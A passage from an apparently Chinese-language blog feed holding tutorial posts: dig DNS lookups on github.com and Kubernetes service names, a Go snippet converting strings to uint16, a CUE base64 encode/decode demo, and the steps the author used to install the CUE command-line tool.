class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; -x 192.30.252.153<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 48615</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;153.252.30.192.in-addr.arpa.   IN      PTR</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">153.252.30.192.in-addr.arpa. 0  IN      PTR     lb-192-30-252-153-iad.github.com.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 388 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:28:40 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 102</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="dig-a-github-com-和-dig-ns-github-com-和-dig-mx-github-com-显示详情"><a href="#dig-a-github-com-和-dig-ns-github-com-和-dig-mx-github-com-显示详情" class="headerlink" title="dig a github.com 和 dig ns github.com 和 dig mx github.com 显示详情"></a>dig a github.com 和 dig ns github.com 和 dig mx github.com 显示详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig a github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; a github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 14608</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;github.com.                    IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">github.com.             0       IN      A       140.82.114.3</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 1 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:31:27 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 55</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig ns github.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; ns github.com</span><br><span class="hljs-string">;; global options: +cmd</span><br><span class="hljs-string">;; Got answer:</span><br><span class="hljs-string">;; -&gt;&gt;HEADER&lt;&lt;- opcode</span>: QUERY, status: NOERROR, <span class="hljs-built_in">id</span>: 22967<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 1<br><br>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 65494<br>;; QUESTION SECTION:<br>;github.com.                    IN      NS<br><br>;; ANSWER SECTION:<br>github.com.             0       IN      NS      ns-520.awsdns-01.net.<br>github.com.             0       IN      NS      dns1.p08.nsone.net.<br>github.com.             0       IN      NS      ns-421.awsdns-52.com.<br>github.com.             0       IN      NS      dns4.p08.nsone.net.<br>github.com.             0       IN      NS      dns3.p08.nsone.net.<br>github.com.             0       IN      NS      dns2.p08.nsone.net.<br>github.com.             0       IN      NS      ns-1707.awsdns-21.co.uk.<br>github.com.             0       IN      NS      ns-1283.awsdns-32.org.<br><br>;; Query time: 15 msec<br>;; SERVER: 127.0.0.53<span class="hljs-comment">#53(127.0.0.53)</span><br>;; WHEN: Sat Sep 24 11:31:36 CST 2022<br>;; MSG SIZE  rcvd: 262<br><br><br><br><br><br>[root@ningan ~]<span class="hljs-comment"># dig mx github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; mx github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 64538</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;github.com.                    IN      MX</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">github.com.             0       IN      MX      10 alt3.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      5 alt2.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      5 alt1.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      10 alt4.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      1 aspmx.l.google.com.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 15 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:31:56 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 154</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="dig-a-facebook-github-com-和-dig-aaaa-facebook-github-com"><a href="#dig-a-facebook-github-com-和-dig-aaaa-facebook-github-com" class="headerlink" title="dig  a facebook.github.com 和  dig  aaaa facebook.github.com"></a>dig  a facebook.github.com 和  dig  aaaa facebook.github.com</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig  a facebook.github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; a facebook.github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 4880</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;facebook.github.com.           IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">facebook.github.com.    0       IN      CNAME   github.github.io.</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.109.153</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.110.153</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.111.153</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.108.153</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 1 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:42:54 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 142</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig  aaaa facebook.github.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; aaaa facebook.github.com</span><br><span class="hljs-string">;; global options: +cmd</span><br><span class="hljs-string">;; Got answer:</span><br><span class="hljs-string">;; -&gt;&gt;HEADER&lt;&lt;- opcode</span>: QUERY, status: NOERROR, <span class="hljs-built_in">id</span>: 12984<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1<br><br>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 65494<br>;; QUESTION SECTION:<br>;facebook.github.com.           IN      AAAA<br><br>;; ANSWER SECTION:<br>facebook.github.com.    0       IN      CNAME   github.github.io.<br>github.github.io.       0       IN      AAAA    2606:50c0:8000::153<br>github.github.io.       0       IN      AAAA    2606:50c0:8002::153<br>github.github.io.       0       IN      AAAA    2606:50c0:8001::153<br>github.github.io.       0       IN      AAAA    2606:50c0:8003::153<br><br>;; Query time: 7 msec<br>;; SERVER: 127.0.0.53<span class="hljs-comment">#53(127.0.0.53)</span><br>;; WHEN: Sat Sep 24 11:42:49 CST 2022<br>;; MSG SIZE  rcvd: 190<br><br></code></pre></td></tr></table></figure><h3 id="dig-cname-facebook-github-com-显示详情"><a href="#dig-cname-facebook-github-com-显示详情" class="headerlink" title="dig cname facebook.github.com 显示详情"></a>dig cname facebook.github.com 显示详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig cname facebook.github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; cname facebook.github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 43133</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;facebook.github.com.           IN      CNAME</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">facebook.github.com.    0       IN      CNAME   github.github.io.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 355 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:59:13 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 78</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig facebook.github.com +short</span><br><span class="hljs-string">github.github.io.</span><br><span class="hljs-string">185.199.109.153</span><br><span class="hljs-string">185.199.110.153</span><br><span class="hljs-string">185.199.111.153</span><br><span class="hljs-string">185.199.108.153</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig github.github.io +short</span><br><span class="hljs-string">185.199.109.153</span><br><span class="hljs-string">185.199.110.153</span><br><span class="hljs-string">185.199.111.153</span><br><span class="hljs-string">185.199.108.153</span><br><span class="hljs-string">[root@ningan ~]#</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="dig-amp-amp-k8s"><a href="#dig-amp-amp-k8s" class="headerlink" title="dig &amp;&amp; k8s"></a>dig &amp;&amp; k8s</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig kubernetes.default +search<br>dig kubernetes.default A kubernetes.default AAAA  +search<br>nslookup kubernetes.default<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ruanyifeng.com/blog/2016/06/dns.html">DNS 原理入门</a>    写的灰常好，推荐<br><a href="https://cloud.tencent.com/developer/article/1366027">dig 命令洞察 DNS 解析过程</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>net</tag>
      
      <tag>dig</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【go语言系列】go类型转换：字符串转化为uint16</title>
    <link href="/2022/08/17/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91go%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8C%96%E4%B8%BAuint16/"/>
    <url>/2022/08/17/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91go%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8C%96%E4%B8%BAuint16/</url>
    
    <content type="html"><![CDATA[<h2 id="字符串转化为uint16"><a href="#字符串转化为uint16" class="headerlink" title="字符串转化为uint16"></a>字符串转化为uint16</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 方法1</span><br>port1, err := strconv.Atoi(<span class="hljs-string">&quot;12345&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>port2 := <span class="hljs-type">uint16</span>(port1)<br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port1, port1) <span class="hljs-comment">// type:int  value:12345</span><br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port2, port2) <span class="hljs-comment">// type:uint16  value:12345</span><br>fmt.Println(port2)                              <span class="hljs-comment">// 12345</span><br><br><span class="hljs-comment">// 方法2</span><br>port3, err := strconv.ParseUint(<span class="hljs-string">&quot;1234&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>port4 := <span class="hljs-type">uint16</span>(port3)<br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port3, port3) <span class="hljs-comment">// type:uint64  value:1234</span><br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port4, port4) <span class="hljs-comment">// type:uint16  value:1234</span><br>fmt.Println(port4)                              <span class="hljs-comment">// 1234</span><br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【cue语言系列】(202208) base64编解码</title>
    <link href="/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20base64%E7%BC%96%E8%A7%A3%E7%A0%81/"/>
    <url>/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20base64%E7%BC%96%E8%A7%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="在线运行"><a href="#在线运行" class="headerlink" title="在线运行"></a>在线运行</h2><p><a href="https://cuelang.org/play/#cue@export@cue">工具</a></p><p>三种不同的输出方式，输出的结果是不一样的</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151050020.png" alt="image-20220812151050020"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151109172.png" alt="image-20220812151109172"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151149851.png" alt="image-20220812151149851"></p><h2 id="本地模拟"><a href="#本地模拟" class="headerlink" title="本地模拟"></a>本地模拟</h2><p>base64.cue</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master <span class="hljs-built_in">base64</span>]<span class="hljs-comment"># cat base64.cue</span><br>import <span class="hljs-string">&quot;encoding/base64&quot;</span><br><br>t1: base64.Encode(null, <span class="hljs-string">&quot;foo&quot;</span>)<br>t2: base64.Decode(null, base64.Encode(null, <span class="hljs-string">&quot;foo&quot;</span>))<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master cuePractice]<span class="hljs-comment"># cue version</span><br>cue version v0.4.3 linux/amd64<br>[root@master cuePractice]<span class="hljs-comment"># </span><br>[root@master cuePractice]<span class="hljs-comment"># cue export base64/base64.cue</span><br>&#123;<br>    <span class="hljs-string">&quot;t1&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span>,<br>    <span class="hljs-string">&quot;t2&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span><br>&#125;<br>[root@master cuePractice]<span class="hljs-comment"># cue export base64/base64.cue --out json</span><br>&#123;<br>    <span class="hljs-string">&quot;t1&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span>,<br>    <span class="hljs-string">&quot;t2&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span><br>&#125;<br>[root@master cuePractice]<span class="hljs-comment"># cue export base64/base64.cue --out yaml</span><br>t1: Zm9v<br>t2: !!binary Zm9v<br>[root@master cuePractice]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master cuePractice]<span class="hljs-comment"># go run base64/base64.go</span><br>scheme: <br>&#123;<br>        t1: <span class="hljs-string">&quot;Zm9v&quot;</span><br>        t2: <span class="hljs-string">&#x27;foo&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812150805711.png" alt="image-20220812150805711"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// base64.go</span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;errors&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;path/filepath&quot;</span><br><br><span class="hljs-string">&quot;cuelang.org/go/cue&quot;</span><br><span class="hljs-string">&quot;cuelang.org/go/cue/cuecontext&quot;</span><br>cueerror <span class="hljs-string">&quot;cuelang.org/go/cue/errors&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>ctx := cuecontext.New()<br><br>clusterVal := ctx.NewList()<br><br>confPath := <span class="hljs-string">&quot;/root/cuePractice/base64&quot;</span><br>fileData, err := os.ReadFile(filepath.Join(confPath, <span class="hljs-string">&quot;base64.cue&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err.Error())<br>&#125;<br><br>scheme := ctx.CompileBytes(fileData, cue.Scope(clusterVal))<br><span class="hljs-keyword">if</span> scheme.Err() != <span class="hljs-literal">nil</span> &#123;<br>msg := cueerror.Details(scheme.Err(), <span class="hljs-literal">nil</span>)<br>fmt.Println(errors.New(msg))<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;scheme: \n%s\n&quot;</span>, scheme)<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151403446.png" alt="image-20220812151403446"></p>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【cue语言系列】(202208) 安装cue</title>
    <link href="/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20%E5%AE%89%E8%A3%85cue/"/>
    <url>/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20%E5%AE%89%E8%A3%85cue/</url>
    
    <content type="html"><![CDATA[<h2 id="安装方式：源码安装"><a href="#安装方式：源码安装" class="headerlink" title="安装方式：源码安装"></a>安装方式：源码安装</h2><p><a href="https://github.com/cue-lang/cue">cue官网</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1 ~]<span class="hljs-comment"># mkdir cuetest</span><br>[root@node1 ~]<span class="hljs-comment"># cd cuetest/</span><br>[root@node1 ~]<span class="hljs-comment"># wget https://github.com/cue-lang/cue/releases/download/v0.4.3/cue_v0.4.3_linux_amd64.tar.gz</span><br>[root@node1 ~]<span class="hljs-comment"># tar -zxvf cue_v0.4.3_linux_amd64.tar.gz</span><br>[root@node1 cuetest]<span class="hljs-comment"># ll</span><br>总用量 19656<br>-rwxr-xr-x 1 1001  116 14069760 4月  21 17:13 cue<br>-rw-r--r-- 1 root root  6037013 4月  21 17:16 cue_v0.4.3_linux_amd64.tar.gz<br>drwxr-xr-x 4 root root       33 8月  12 14:16 doc<br>-rw-r--r-- 1 1001  116    11358 4月  21 17:12 LICENSE<br>-rw-r--r-- 1 1001  116     5728 4月  21 17:12 README.md<br>[root@node1 cuetest]<span class="hljs-comment"># ./cue version</span><br>cue version v0.4.3 linux/amd64<br>[root@node1 cuetest]<span class="hljs-comment"># mv cue /usr/local/bin</span><br>[root@node1 cuetest]<span class="hljs-comment"># cue version</span><br>cue version v0.4.3 linux/amd64<br></code></pre></td></tr></table></figure><h2 id="20230606更新"><a href="#20230606更新" class="headerlink" title="20230606更新"></a>20230606更新</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/cue-lang/cue/releases/download/v0.5.0/cue_v0.5.0_linux_amd64.tar.gz<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
